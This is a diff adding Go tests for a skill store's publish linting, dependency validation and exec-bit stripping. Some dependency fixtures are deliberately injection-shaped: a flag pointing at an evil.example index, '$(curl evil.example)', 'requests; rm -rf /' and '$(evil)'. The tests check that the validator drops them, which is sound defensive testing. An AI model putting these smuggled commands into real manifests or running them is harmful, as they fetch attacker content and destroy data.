@@ -11,6 +11,36 @@ import (
 	"testing"
 )
 
+// One-level references: SKILL.md may link to files under the resource dirs,
+// resource files may not chain to further tree files, and links must resolve
+// to files that exist (R7.1/D1 lint).
+func TestPublishRejectsBrokenOrChainedRefs(t *testing.T) {
+	s := newStore(t, ScopeUser)
+	head := "---\nname: demo\ndescription: \"d\"\n---\n\n"
+	bad := map[string]Tree{
+		"missing-ref": skillTree("[guide](references/missing.md)"),
+		"deep-ref":    skillTree("[guide](references/deep/nested.md)"),
+		"escape":      skillTree("[guide](../other/x.md)"),
+		"chained": {
+			SkillFile:         File{Data: []byte(head + "[guide](references/a.md)")},
+			"references/a.md": File{Data: []byte("see [next](references/b.md)")},
+			"references/b.md": File{Data: []byte("leaf")},
+		},
+	}
+	for name, tree := range bad {
+		if _, err := s.Publish("demo", tree, IndexMeta{Author: "u", Source: "user"}); err == nil {
+			t.Fatalf("%s: lint must reject", name)
+		}
+	}
+	ok := Tree{
+		SkillFile:         File{Data: []byte(head + "[guide](references/a.md) and [docs](https://example.com) and [top](#top)")},
+		"references/a.md": File{Data: []byte("[ext](https://example.com) and [anchor](#a)")},
+	}
+	if _, err := s.Publish("demo", ok, IndexMeta{Author: "u", Source: "user"}); err != nil {
+		t.Fatalf("valid tree rejected: %v", err)
+	}
+}
+
 func newStore(t *testing.T, scope Scope) *Store {
 	t.Helper()
 	s, err := Open(filepath.Join(t.TempDir(), "skills"), scope)
@@ -689,6 +719,151 @@ metadata:
 	}
 	if len(m.Requires.Bins) != 1 || m.Requires.Bins[0] != "jq" {
 		t.Fatalf("openclaw bins not folded: %+v", m.Requires.Bins)
+	}
+}
+
+// metadata.deps entries validate against the scheme:package shape; anything
+// injection-shaped (flags, URLs, shell syntax) is dropped, never executed
+// (R7.4).
+func TestParseManifestDepsValidation(t *testing.T) {
+	body := `---
+name: deps
+description: "d"
+metadata:
+  deps:
+    - pip:requests>=2,<3
+    - npm:left-pad@1.3.0
+    - system:ffmpeg
+    - "pip:--index-url https://evil.example"
+    - "npm:$(curl evil.example)"
+    - "pip:requests; rm -rf /"
+    - "cargo:ripgrep"
+    - "notaspec"
+---`
+	m, _, err := ParseSkillMD("deps", []byte(body), false)
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := []string{"pip:requests>=2,<3", "npm:left-pad@1.3.0", "system:ffmpeg"}
+	if !slices.Equal(m.Requires.Deps, want) {
+		t.Fatalf("deps = %v, want %v", m.Requires.Deps, want)
+	}
+}
+
+// R7.4: `uv run`/`npx` pin declarations normalize to their scheme with the
+// pinned version; unpinned or flag-bearing runner commands are dropped.
+func TestDepsUVNpxPins(t *testing.T) {
+	dir := filepath.Join(t.TempDir(), "src")
+	body := "---\nname: pinned\ndescription: d\nmetadata:\n  deps:\n" +
+		"    - uv run --with requests@2.31.0\n" +
+		"    - npx -y prettier@3.2.5\n" +
+		"    - uv run --with requests\n" +
+		"    - npx prettier\n" +
+		"    - uv run --with $(evil)\n" +
+		"    - uv run --system pip install requests@2\n" +
+		"---\nbody"
+	if err := os.MkdirAll(filepath.Join(dir, "pinned"), 0755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(dir, "pinned", SkillFile), []byte(body), 0644); err != nil {
+		t.Fatal(err)
+	}
+	idx, err := Build(filepath.Join(t.TempDir(), "eff"), []Source{{Name: "user", Dir: dir}})
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := []string{"pip:requests@2.31.0", "npm:prettier@3.2.5"}
+	if got := idx.Skills[0].Requires.Deps; !slices.Equal(got, want) {
+		t.Fatalf("deps = %v, want %v", got, want)
+	}
+}
+
+// PEP 723 dependency blocks inside scripts/*.py fold into the entry's
+// validated deps — same allowlist, injection-shaped lines dropped (R7.4).
+func TestBuildExtractsPEP723Deps(t *testing.T) {
+	dir := filepath.Join(t.TempDir(), "src")
+	skill := Tree{
+		SkillFile: File{Data: []byte("---\nname: demo\ndescription: d\n---\nbody")},
+		"scripts/tool.py": File{Data: []byte(`#!/usr/bin/env python3
+# /// script
+# requires-python = ">=3.11"
+# dependencies = [
+#   "requests>=2",
+#   "click",
+#   "$(evil)",
+# ]
+# ///
+import requests
+`)},
+	}
+	if err := os.MkdirAll(filepath.Join(dir, "demo", "scripts"), 0755); err != nil {
+		t.Fatal(err)
+	}
+	for path, f := range skill {
+		dest := filepath.Join(dir, "demo", filepath.FromSlash(path))
+		if err := os.WriteFile(dest, f.Data, 0644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	idx, err := Build(filepath.Join(t.TempDir(), "eff"), []Source{{Name: "user", Dir: dir}})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(idx.Skills) != 1 {
+		t.Fatalf("skills: %+v", idx.Skills)
+	}
+	want := []string{"pip:requests>=2", "pip:click"}
+	if got := idx.Skills[0].Requires.Deps; !slices.Equal(got, want) {
+		t.Fatalf("deps = %v, want %v", got, want)
+	}
+}
+
+// R7.2: the effective view carries no exec bit anywhere — scripts are data;
+// execution happens only from a scratch copy inside the cell. (Vacuous on
+// Windows, where stat perm bits are synthesized; binding on the Linux
+// daemon.)
+func TestBuildStripsExecBits(t *testing.T) {
+	eff := filepath.Join(t.TempDir(), "eff")
+	src := filepath.Join(t.TempDir(), "src")
+	if err := os.MkdirAll(filepath.Join(src, "runner", "scripts"), 0755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.MkdirAll(filepath.Join(src, "runner", "references"), 0755); err != nil {
+		t.Fatal(err)
+	}
+	files := map[string][]byte{
+		"SKILL.md":        []byte("---\nname: runner\ndescription: d\n---\n"),
+		"scripts/s.sh":    []byte("#!/bin/sh\nexit 0\n"),
+		"references/r.md": []byte("ref\n"),
+	}
+	for path, data := range files {
+		if err := os.WriteFile(filepath.Join(src, "runner", filepath.FromSlash(path)), data, 0755); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if _, err := Build(eff, []Source{{Name: "user", Dir: src}}); err != nil {
+		t.Fatal(err)
+	}
+	err := filepath.Walk(eff, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+		if !info.IsDir() && info.Mode().Perm()&0111 != 0 {
+			return fmt.Errorf("effective view file %s carries exec bits", path)
+		}
+		return nil
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	// Cross-platform: the tree Build hands to writeTree must carry no exec
+	// flags at all — exec bits are synthesized away on Windows but matter
+	// on the Linux daemon the mount serves.
+	stripped := noexecTree(Tree{"scripts/s.sh": {Exec: true, Data: []byte("x")}, "SKILL.md": {Data: []byte("m")}})
+	for path, f := range stripped {
+		if f.Exec {
+			t.Fatalf("noexecTree kept exec on %s", path)
+		}
 	}
 }
 
